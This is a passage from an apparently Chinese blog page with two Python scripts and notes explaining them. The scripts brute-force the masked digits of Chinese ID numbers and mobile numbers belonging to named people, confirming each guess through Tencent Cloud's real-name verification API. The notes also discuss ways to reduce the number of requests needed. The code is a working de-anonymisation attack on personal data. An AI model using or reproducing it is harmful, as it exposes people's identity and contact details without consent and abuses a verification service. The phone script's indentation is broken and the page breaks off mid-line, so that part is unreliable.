class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Value</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common <span class="keyword">import</span> credential</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.profile.client_profile <span class="keyword">import</span> ClientProfile</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.profile.http_profile <span class="keyword">import</span> HttpProfile</span><br><span class="line"><span class="keyword">from</span> tencentcloud.faceid.v20180301 <span class="keyword">import</span> faceid_client <span class="keyword">as</span> faceid</span><br><span class="line"><span class="keyword">from</span> tencentcloud.faceid.v20180301.models <span class="keyword">import</span> IdCardVerificationRequest</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请替换以下信息为您的腾讯云API密钥</span></span><br><span class="line">SECRET_ID = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">SECRET_KEY = <span class="string">&quot;xxx&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_checkbit</span>(<span class="params">id_number: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    weight = [<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line">    check_code = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    sum_ = <span class="built_in">sum</span>([<span class="built_in">int</span>(id_number[i]) * weight[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>)])</span><br><span class="line">    <span class="keyword">return</span> check_code[sum_ % <span class="number">11</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_number</span>(<span class="params">id_number: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^\d&#123;17&#125;[\dXx]$&#x27;</span>, id_number):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> id_number[-<span class="number">1</span>].upper() == get_checkbit(id_number):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_id_number</span>(<span class="params">id_number: <span class="built_in">str</span>, name: <span class="built_in">str</span>, counter: <span class="built_in">dict</span>, lock: Lock</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    cred = credential.Credential(SECRET_ID, SECRET_KEY)</span><br><span class="line">    httpProfile = HttpProfile()</span><br><span class="line">    httpProfile.endpoint = <span class="string">&quot;faceid.tencentcloudapi.com&quot;</span></span><br><span class="line"></span><br><span class="line">    clientProfile = ClientProfile()</span><br><span class="line">    clientProfile.httpProfile = httpProfile</span><br><span class="line">    client = faceid.FaceidClient(cred, <span class="string">&quot;ap-beijing&quot;</span>, clientProfile)</span><br><span class="line"></span><br><span class="line">    req = IdCardVerificationRequest()</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;IdCard&quot;</span>: id_number,</span><br><span class="line">        <span class="string">&quot;Name&quot;</span>: name</span><br><span class="line">    &#125;</span><br><span class="line">    req.from_json_string(json.dumps(params))</span><br><span class="line">    <span class="keyword">with</span> lock:</span><br><span class="line">        counter.value += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = client.IdCardVerification(req)</span><br><span class="line">        <span class="comment"># print(resp)</span></span><br><span class="line">        <span class="keyword">if</span> resp <span class="keyword">and</span> resp.Result == <span class="string">&quot;0&quot;</span>:  <span class="comment"># 如果Result为0，则验证成功</span></span><br><span class="line">            <span class="built_in">print</span>(resp)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error occurred while validating ID <span class="subst">&#123;id_number&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_id_numbers</span>(<span class="params">partial_id: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">    missing_digits = <span class="number">18</span> - <span class="built_in">len</span>(partial_id.replace(<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    id_numbers = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> combination <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">10</span>), repeat=missing_digits):</span><br><span class="line">        id_number = partial_id</span><br><span class="line">        <span class="keyword">for</span> digit <span class="keyword">in</span> combination:</span><br><span class="line">            id_number = id_number.replace(<span class="string">&#x27;*&#x27;</span>, <span class="built_in">str</span>(digit), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 身份证号码第7-10位表示年份，只能在1930-2020之间</span></span><br><span class="line">        year = <span class="built_in">int</span>(id_number[<span class="number">6</span>:<span class="number">10</span>])</span><br><span class="line">        <span class="keyword">if</span> year &lt; <span class="number">1970</span> <span class="keyword">or</span> year &gt; <span class="number">2000</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 身份证号码第11位只能在0, 1之间</span></span><br><span class="line">        tens_digit_month1 = <span class="built_in">int</span>(id_number[<span class="number">10</span>])</span><br><span class="line">        <span class="keyword">if</span> tens_digit_month1 <span class="keyword">not</span> <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 身份证号码第12位的范围取决于第11位</span></span><br><span class="line">        tens_digit_month2 = <span class="built_in">int</span>(id_number[<span class="number">11</span>])</span><br><span class="line">        <span class="keyword">if</span> tens_digit_month1 == <span class="number">1</span> <span class="keyword">and</span> tens_digit_month2 <span class="keyword">not</span> <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 身份证号码第11位和第12位不能同时为0</span></span><br><span class="line">        month = <span class="built_in">int</span>(id_number[<span class="number">10</span>:<span class="number">12</span>])</span><br><span class="line">        <span class="keyword">if</span> month == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 身份证号码第13位只能在0, 1, 2, 3之间</span></span><br><span class="line">        tens_digit_day = <span class="built_in">int</span>(id_number[<span class="number">12</span>])</span><br><span class="line">        <span class="keyword">if</span> tens_digit_day <span class="keyword">not</span> <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 身份证号码第14位只能在1-9之间</span></span><br><span class="line">        ones_digit_day = <span class="built_in">int</span>(id_number[<span class="number">13</span>])</span><br><span class="line">        <span class="keyword">if</span> ones_digit_day &lt; <span class="number">1</span> <span class="keyword">or</span> ones_digit_day &gt; <span class="number">9</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        id_numbers.append(id_number)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> id_numbers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_excel</span>(<span class="params">file_path: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]]:</span><br><span class="line">    data = []</span><br><span class="line">    workbook = xlrd.open_workbook(file_path)</span><br><span class="line">    sheet = workbook.sheet_by_index(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, sheet.nrows):</span><br><span class="line">        name = sheet.cell_value(row, <span class="number">1</span>)</span><br><span class="line">        id_number = sheet.cell_value(row, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 只获取有姓名的数据</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> name.strip():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 只获取身份证位18位的</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(id_number) != <span class="number">18</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 身份证号除了第7-12位外其他位不为*的才取出来</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">in</span> id_number[:<span class="number">6</span>] <span class="keyword">or</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">in</span> id_number[<span class="number">12</span>:]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        data.append((name, id_number))</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_excel</span>(<span class="params">data: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]], file_path: <span class="built_in">str</span></span>):</span><br><span class="line">    workbook = xlwt.Workbook()</span><br><span class="line">    sheet = workbook.add_sheet(<span class="string">&#x27;Result&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> row, (name, id_number) <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        sheet.write(row, <span class="number">0</span>, name)</span><br><span class="line">        sheet.write(row, <span class="number">1</span>, id_number)</span><br><span class="line"></span><br><span class="line">    workbook.save(file_path)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_id_number</span>(<span class="params">name: <span class="built_in">str</span>, partial_id: <span class="built_in">str</span>, result: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]], index: <span class="built_in">int</span>, counter1: <span class="built_in">dict</span>, lock: Lock</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Processing <span class="subst">&#123;name&#125;</span> with partial ID <span class="subst">&#123;partial_id&#125;</span> in thread <span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line">    counter = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> id_number <span class="keyword">in</span> generate_id_numbers(partial_id):</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> counter % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;index&#125;</span> progress: <span class="subst">&#123;counter&#125;</span> IDs checked&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> check_number(id_number):</span><br><span class="line">            <span class="built_in">print</span>(id_number)</span><br><span class="line">            check = is_valid_id_number(id_number, name, counter1, lock)</span><br><span class="line">            <span class="built_in">print</span>(check)</span><br><span class="line">            <span class="keyword">if</span> check:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>正确的身份证<span class="subst">&#123;id_number&#125;</span>&quot;</span>)</span><br><span class="line">                result.append((name, id_number))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;index&#125;</span> found valid ID: <span class="subst">&#123;name&#125;</span>, <span class="subst">&#123;id_number&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># else:</span></span><br><span class="line">            <span class="comment">#     print(f&quot;&#123;name&#125;错误的身份证&#123;id_number&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">file_path: <span class="built_in">str</span></span>):</span><br><span class="line">    data = read_excel(file_path)</span><br><span class="line">    result = []</span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    counter = Value(<span class="string">&#x27;i&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    lock = Lock()</span><br><span class="line">    <span class="keyword">for</span> index, (name, partial_id) <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        thread = threading.Thread(target=process_id_number, args=(name, partial_id, result, index, counter, lock))</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n总共请求接口次数: <span class="subst">&#123;counter.value&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n成功了:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> name, id_number <span class="keyword">in</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>, <span class="subst">&#123;id_number&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    write_excel(result, <span class="string">&#x27;result.xls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--data&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Path to the input Excel file (.xls)&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    main(args.data)</span><br></pre></td></tr></table></figure><h1 id="uKHcN">手机号恢复</h1><h2 id="w5BHW">目前脚本的思路和流程</h2><ol><li><p>读取Excel文件：read_excel函数从指定的Excel文件中读取姓名和部分手机号（中间四位为*）。这些数据将被存储在一个包含姓名和部分手机号元组的列表中。</p></li><li><p>处理手机号：process_phone_number函数对于每个姓名和部分手机号，遍历所有可能的中间四位数字组合，生成完整的手机号。对于每个生成的手机号，首先使用has_consecutive_same_digits函数检查中间四位是否包含3个或4个相同的数字，如果包含，则跳过该手机号。然后，使用is_valid_phone_number函数验证手机号是否与给定的姓名匹配。如果匹配，将姓名和手机号添加到结果列表中，并停止遍历其他组合。</p></li><li><p>验证手机号：is_valid_phone_number函数使用腾讯云的实名认证接口来验证给定的姓名和手机号是否匹配。如果匹配，返回True，否则返回False。</p></li><li><p>多线程处理：为了加快处理速度，脚本为每个姓名和部分手机号创建一个线程，同时处理多个手机号。线程通过共享的结果列表、计数器和锁来同步。</p></li><li><p>输出结果：当所有线程完成处理后，脚本将输出成功匹配的姓名和手机号，并将结果写入一个新的Excel文件（result.xls）。</p></li><li><p>主函数：main函数是脚本的入口点。它首先解析命令行参数以获取输入Excel文件的路径，然后调用上述函数依次执行整个流程。</p><h2 id="EFd5s">可以加入的方法</h2>这里本地如果可以像身份证一样排除一些号码，就会少一些成本</li></ol><p>比如3个4个的相同数字或者连号，豹子号一般不会给到普通人（我们是否可以写脚本去减少请求次数）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Value</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common <span class="keyword">import</span> credential</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.profile.client_profile <span class="keyword">import</span> ClientProfile</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.profile.http_profile <span class="keyword">import</span> HttpProfile</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.exception.tencent_cloud_sdk_exception <span class="keyword">import</span> TencentCloudSDKException</span><br><span class="line"><span class="keyword">from</span> tencentcloud.faceid.v20180301 <span class="keyword">import</span> faceid_client <span class="keyword">as</span> faceid</span><br><span class="line"><span class="keyword">from</span> tencentcloud.faceid.v20180301.models <span class="keyword">import</span> CheckPhoneAndNameRequest</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请替换以下信息为您的腾讯云API密钥</span></span><br><span class="line">SECRET_ID = <span class="string">&quot;Axxxx&quot;</span></span><br><span class="line">SECRET_KEY = <span class="string">&quot;xxxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_phone_number</span>(<span class="params">phone_number: <span class="built_in">str</span>, name: <span class="built_in">str</span>, counter: <span class="built_in">dict</span>, lock: Lock</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="built_in">print</span>(phone_number,name)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cred = credential.Credential(SECRET_ID, SECRET_KEY)</span><br><span class="line">        httpProfile = HttpProfile()</span><br><span class="line">        httpProfile.endpoint = <span class="string">&quot;faceid.tencentcloudapi.com&quot;</span></span><br><span class="line"></span><br><span class="line">        clientProfile = ClientProfile()</span><br><span class="line">        clientProfile.httpProfile = httpProfile</span><br><span class="line">        client = faceid.FaceidClient(cred, <span class="string">&quot;&quot;</span>, clientProfile)</span><br><span class="line"></span><br><span class="line">        req = CheckPhoneAndNameRequest()</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&quot;Mobile&quot;</span>: phone_number,</span><br><span class="line">            <span class="string">&quot;Name&quot;</span>: name</span><br><span class="line">        &#125;</span><br><span class="line">        req.from_json_string(json.dumps(params))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> lock:</span><br><span class="line">            counter.value += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        resp = client.CheckPhoneAndName(req)</span><br><span class="line">        <span class="keyword">if</span> resp <span class="keyword">and</span> resp.Result == <span class="string">&quot;0&quot;</span>:  <span class="comment"># 如果Result为0，则验证成功</span></span><br><span class="line">            <span class="built_in">print</span>(resp)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> TencentCloudSDKException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error occurred while validating phone number <span class="subst">&#123;phone_number&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_excel</span>(<span class="params">file_path: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始读取数据&quot;</span>)</span><br><span class="line">    data = []</span><br><span class="line">    workbook = xlrd.open_workbook(file_path)</span><br><span class="line">    sheet = workbook.sheet_by_index(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, sheet.nrows):</span><br><span class="line">        name = <span class="built_in">str</span>(sheet.cell_value(row, <span class="number">1</span>))</span><br><span class="line">        phone_number = sheet.cell_value(row, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 只获取有姓名的数据</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> name.strip():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 只获取手机号码为11位且中间四位为*的数据</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(phone_number) != <span class="number">11</span> <span class="keyword">or</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> phone_number[<span class="number">3</span>:<span class="number">7</span>]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        data.append((name, phone_number))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_excel</span>(<span class="params">data: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]], file_path: <span class="built_in">str</span></span>):</span><br><span class="line">    workbook = xlwt.Workbook()</span><br><span class="line">    sheet = workbook.add_sheet(<span class="string">&#x27;Result&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> row, (name, phone_number) <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        sheet.write(row, <span class="number">0</span>, name)</span><br><span class="line">        sheet.write(row, <span class="number">1</span>, phone_number)</span><br><span class="line"></span><br><span class="line">    workbook.save(file_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_phone_number</span>(<span class="params">name: <span class="built_in">str</span>, partial_phone: <span class="built_in">str</span>, result: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]], index: <span class="built_in">int</span>, counter1: <span class="built_in">dict</span>, lock: Lock</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Processing <span class="subst">&#123;name&#125;</span> with partial phone number <span class="subst">&#123;partial_phone&#125;</span> in thread <span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line">    counter = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        phone_number = partial_phone[:<span class="number">3</span>] + <span class="string">&quot;&#123;:04d&#125;&quot;</span>.<span class="built_in">format</span>(i) + partial_phone[<span class="number">7</span>:]</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> counter % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;index&#125;</span> progress: <span class="subst">&#123;counter&#125;</span> phone numbers checked&quot;</span>)</span><br><span class="line"></span><br><span class="line">        check = is_valid_phone_number(phone_number, name, counter1, lock)</span><br><span class="line">        <span class="keyword">if</span> check:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>正确的手机号<span class="subst">&#123;phone_number&#125;</span>&quot;</span>)</span><br><span class="line">        result.append((name, phone_number))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Thread <span class="subst">&#123;index&#125;</span> found valid phone number: <span class="subst">&#123;name&#125;</span>, <span class="subst">&#123;phone_number&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">file_path: <span class="built_in">str</span></span>):</span><br><span class="line">        data = read_excel(file_path)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        result = []</span><br><span class="line"></span><br><span class="line">        threads = []</span><br><span class="line">        counter = Value(<span class="string">&#x27;i&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">        lock = Lock()</span><br><span class="line">        <span class="keyword">for</span> index, (name, partial_phone) <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        thread = threading.Thread(target=process_phone_number, args=(name, partial_phone, result, index, counter, lock))</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n总共请求接口次数: <span class="subst">&#123;counter.value&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n成功了:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> name, phone_number <span class="keyword">in</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span 